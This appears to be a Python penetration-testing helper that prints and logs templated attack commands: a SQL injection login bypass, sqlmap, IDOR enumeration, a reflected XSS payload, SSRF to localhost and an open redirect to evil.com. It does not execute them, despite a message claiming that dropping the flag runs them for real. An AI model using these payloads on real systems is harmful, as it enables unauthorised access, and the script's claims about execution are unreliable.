#!/usr/bin/env python3
"""
dry_run_test.py — Safe dry-run testing of exploit chains (no damage).
Usage:
  python3 dry_run_test.py --target "https://..." --chain "sqli_auth_bypass" --dry-run
  python3 dry_run_test.py --target "https://..." --chain "idor_read" --dry-run
"""
import sys, os, argparse, subprocess, json
from datetime import datetime

DRY_RUN_LOG = os.path.join(os.path.dirname(__file__), ".dry_run.log")

EXPLOIT_CHAINS = {
    "sqli_auth_bypass": {
        "description": "SQL Injection Authentication Bypass",
        "steps": [
            {"tool": "curl", "cmd": "curl -s -o /dev/null -w '%{{http_code}}' -d \"username=admin'--&password=test\" {target}/login"},
            {"tool": "sqlmap", "cmd": "sqlmap -u \"{target}/login\" --data=\"username=admin&password=test\" --batch --level=1 --risk=1 --dry-run"},
        ],
        "safe": True,
    },
    "idor_read": {
        "description": "IDOR - Unauthorized Data Access",
        "steps": [
            {"tool": "curl", "cmd": "curl -s {target}/api/users/1"},
            {"tool": "curl", "cmd": "curl -s {target}/api/users/2"},
        ],
        "safe": True,
    },
    "xss_reflected": {
        "description": "Reflected XSS Test",
        "steps": [
            {"tool": "curl", "cmd": "curl -s \"{target}/search?q=test\\\"<script>alert(1)</script>\""},
            {"tool": "kxss", "cmd": "echo \"{target}/search?q=test\\\"<script>alert(1)</script>\" | kxss"},
        ],
        "safe": True,
    },
    "ssrf_internal": {
        "description": "SSRF Internal Scan",
        "steps": [
            {"tool": "curl", "cmd": "curl -s -d \"url=http://127.0.0.1\" {target}/fetch"},
        ],
        "safe": True,
    },
    "open_redirect": {
        "description": "Open Redirect Test",
        "steps": [
            {"tool": "curl", "cmd": "curl -sI \"{target}/redirect?url=https://evil.com\" | grep -i location"},
        ],
        "safe": True,
    },
}

def run_dry_run(target, chain_name):
    if chain_name not in EXPLOIT_CHAINS:
        print(f"[DRY-RUN] Unknown chain: {chain_name}")
        print(f"[DRY-RUN] Available chains: {', '.join(EXPLOIT_CHAINS.keys())}")
        return False

    chain = EXPLOIT_CHAINS[chain_name]
    print(f"[DRY-RUN] Chain: {chain['description']}")
    print(f"[DRY-RUN] Target: {target}")
    print(f"[DRY-RUN] Safe: {chain['safe']}")
    print(f"[DRY-RUN] Steps: {len(chain['steps'])}")
    print()

    results = []
    for i, step in enumerate(chain["steps"], 1):
        cmd = step["cmd"].replace("{target}", target.rstrip("/"))
        print(f"  Step {i} [{step['tool']}]: {cmd}")

        # In dry-run mode, just log the command, don't execute
        results.append({
            "step": i,
            "tool": step["tool"],
            "command": cmd,
            "status": "dry_run",
            "timestamp": datetime.now(__import__("datetime").timezone.utc).isoformat(),
        })

    # Save dry-run log
    with open(DRY_RUN_LOG, "a", encoding="utf-8") as f:
        log_entry = {
            "target": target,
            "chain": chain_name,
            "results": results,
            "timestamp": datetime.now(__import__("datetime").timezone.utc).isoformat(),
        }
        f.write(json.dumps(log_entry) + "\n")

    print(f"\n[DRY-RUN] Logged {len(results)} steps to {DRY_RUN_LOG}")
    print(f"[DRY-RUN] To execute for real: remove --dry-run flag")
    return True

def list_chains():
    print("[DRY-RUN] Available exploit chains:")
    for name, chain in EXPLOIT_CHAINS.items():
        print(f"  {name} — {chain['description']} ({len(chain['steps'])} steps)")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Dry-run exploit chain testing (safe)")
    parser.add_argument("--target", default="https://example.com")
    parser.add_argument("--chain", default="sqli_auth_bypass")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--list", action="store_true")
    args = parser.parse_args()

    if args.list:
        list_chains()
    elif args.dry_run:
        run_dry_run(args.target, args.chain)
    else:
        print("[DRY-RUN] WARNING: --dry-run flag required. This tool is for safe testing only.")
        print("[DRY-RUN] Use --dry-run to preview exploit chains without execution.")
